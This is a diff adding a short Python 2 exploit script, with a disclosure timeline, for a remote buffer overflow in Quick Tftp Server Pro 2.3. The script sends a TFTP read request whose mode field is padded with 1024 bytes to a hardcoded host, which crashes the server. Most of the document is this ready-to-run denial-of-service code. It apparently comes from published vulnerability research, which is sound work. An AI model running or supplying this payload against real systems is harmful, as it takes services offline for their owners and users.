@@ -1,0 +1,52 @@
+# Exploit Title: Quick Tftp Server Pro 2.3 TFTP mode Remote Overflow (DoS)
+# Date: 21/01/2016
+# Exploit Author: Guillaume Kaddouch
+#   Twitter: @gkweb76
+#   Blog: https://networkfilter.blogspot.com
+#   GitHub: https://github.com/gkweb76/exploits
+# Vendor Homepage: http://www.tallsoft.com/tftpserver.htm
+# Software Link: http://www.tallsoft.com/tftpserver_setup.exe
+# Version: 2.3
+# Tested on: Windows 7 Family x64 (FR)
+# Category: DoS
+
+"""
+Disclosure Timeline:
+--------------------
+2016-01-21: Vulnerability discovered
+2016-01-24: Vendor contacted
+2016-01-29: Vendor contacted again (no answer)
+2016-03-01: Vulnerability published 
+ 
+Description :
+-------------
+A remote overflow exists in Quick Tftp Server Pro 2.3 in the TFTP mode when sending a TFTP Read Request. This allows to remotely crash
+the application, thus causing a Denial of Service.
+
+ 
+Instructions:
+-------------
+- Starts Quick Tftp Server Pro 2.3
+- Run this exploit locally or from your remote attacking machine
+"""
+
+import socket
+
+host    = "192.168.135.132"
+port    = 69
+
+request = "\x00\x01"    # TFTP Read Request (RRQ)
+file    = "file.txt"
+mode    = '\x41' * 1024 # Overflow
+
+buffer  = request + file + "\x00" + mode + "\x00"
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        print "[*] Sending buffer to %s (%d bytes)..." % (host, len(buffer))
+        s.sendto(buffer, (host, port))
+        s.close()
+        print "[*] Done."
+except:
+        print "[-] Error connecting"
